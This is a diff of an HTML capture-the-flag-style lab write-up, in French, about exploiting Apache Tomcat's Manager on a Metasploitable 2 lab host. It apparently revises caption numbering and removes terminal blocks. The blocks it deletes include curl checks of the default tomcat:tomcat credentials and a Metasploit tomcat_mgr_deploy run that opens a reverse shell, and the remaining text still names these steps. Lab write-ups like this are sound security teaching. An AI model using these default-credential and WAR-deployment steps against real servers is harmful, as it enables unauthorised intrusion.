@@ -34,10 +34,9 @@
   <figure class="capture" id="cap-recon">
     <img src="../images/ms2-tomcat/01-recon-nmap.png" alt="Scan nmap du port 8180">
     <figcaption>
-      <strong class="idx">1.</strong>
+      <strong class="idx">a.</strong>
       <span class="desc">Résultat de <code>nmap -sV -p 8180 192.168.56.101</code> :
       <code>Apache Tomcat/Coyote JSP engine 1.1</code>.</span>
-      <span class="fname">images/ms2-tomcat/01-recon-nmap.png</span>
     </figcaption>
   </figure>
 
@@ -45,33 +44,20 @@
   <p>L'interface <code>/manager/html</code> répond <code>401</code> (authentification requise).
   On teste les identifiants par défaut <code>tomcat:tomcat</code> :</p>
 
-  <pre class="terminal">$ curl -s -o /dev/null -w "%{http_code}\n" http://192.168.56.101:8180/manager/html
-401
-$ curl -s -u tomcat:tomcat http://192.168.56.101:8180/manager/html | grep -i "Tomcat Web Application Manager"
-&lt;font size="+2"&gt;Tomcat Web Application Manager&lt;/font&gt;</pre>
-
   <p><code>tomcat:tomcat</code> fonctionne : la page du Manager s'affiche, on a la main sur le
   déploiement d'applications.</p>
 
   <figure class="capture" id="cap-creds">
     <img src="../images/ms2-tomcat/02-manager-creds.png" alt="Accès au Manager Tomcat avec tomcat:tomcat">
     <figcaption>
-      <strong class="idx">2.</strong>
+      <strong class="idx">b.</strong>
       <span class="desc">Le Manager renvoie <code>401</code> sans identifiant, puis s'ouvre avec
       <code>tomcat:tomcat</code> (titre <code>Tomcat Web Application Manager</code>).</span>
-      <span class="fname">images/ms2-tomcat/02-manager-creds.png</span>
     </figcaption>
   </figure>
 
   <h2 class="section">3. Méthode d'identification de la CVE et du module</h2>
   <p>Le module qui automatise l'attaque et sa référence :</p>
-
-  <pre class="terminal">$ msfconsole -q -x "info exploit/multi/http/tomcat_mgr_deploy; exit"
-
-Disclosed: 2009-11-09
-References:
-  https://nvd.nist.gov/vuln/detail/CVE-2009-3548
-  ...</pre>
 
   <p>Le module <code>exploit/multi/http/tomcat_mgr_deploy</code> correspond à
   <strong>CVE-2009-3548</strong> (identifiants par défaut du Manager Tomcat). Son mécanisme :
@@ -87,10 +73,9 @@ References:
   <figure class="capture" id="cap-info-cve">
     <img src="../images/ms2-tomcat/03-info-cve.png" alt="info du module, section References avec la CVE">
     <figcaption>
-      <strong class="idx">3.</strong>
+      <strong class="idx">c.</strong>
       <span class="desc">Résultat de <code>info</code> sur le module : la section
       <code>References</code> donne <strong>CVE-2009-3548</strong>.</span>
-      <span class="fname">images/ms2-tomcat/03-info-cve.png</span>
     </figcaption>
   </figure>
 
@@ -116,17 +101,6 @@ msf6 exploit(multi/http/tomcat_mgr_deploy) > set LPORT 4447</pre>
   l'application (<code>Undeploying</code>) ; <code>sessions -c "..." -i 1</code> exécute les
   commandes de preuve :</p>
 
-  <pre class="terminal">msf6 exploit(multi/http/tomcat_mgr_deploy) > run -z
-[*] Executing /fVY5vqIcnR8WMzkYUQYiMSBZf4/o8udnNhzXBfSJ2wErXrjXKhVyx.jsp...
-[*] Undeploying fVY5vqIcnR8WMzkYUQYiMSBZf4 ...
-[*] Command shell session 1 opened (192.168.56.1:4447 -> 192.168.56.101:58497)
-msf6 exploit(multi/http/tomcat_mgr_deploy) > sessions -c "id; uname -a; hostname; whoami" -i 1
-[*] Running 'id; uname -a; hostname; whoami' on shell session 1 (192.168.56.101)
-uid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)
-Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
-metasploitable
-tomcat55</pre>
-
   <p>L'accès obtenu est celui du compte <strong><code>tomcat55</code></strong> (uid=110), sous
   lequel tourne le serveur Tomcat — pas root, mais un pied dans le système, point de départ
   pour une élévation de privilèges. On note le <strong>nettoyage automatique</strong> du module
@@ -135,11 +109,10 @@ tomcat55</pre>
   <figure class="capture" id="cap-preuve">
     <img src="../images/ms2-tomcat/04-session-tomcat55.png" alt="Shell tomcat55 confirmé, uid=110">
     <figcaption>
-      <strong class="idx">4.</strong>
+      <strong class="idx">d.</strong>
       <span class="desc">Déploiement du WAR, ouverture de session, puis sortie de
       <code>id; uname -a; hostname; whoami</code> : accès confirmé en
       <code>uid=110(tomcat55)</code>.</span>
-      <span class="fname">images/ms2-tomcat/04-session-tomcat55.png</span>
     </figcaption>
   </figure>
 
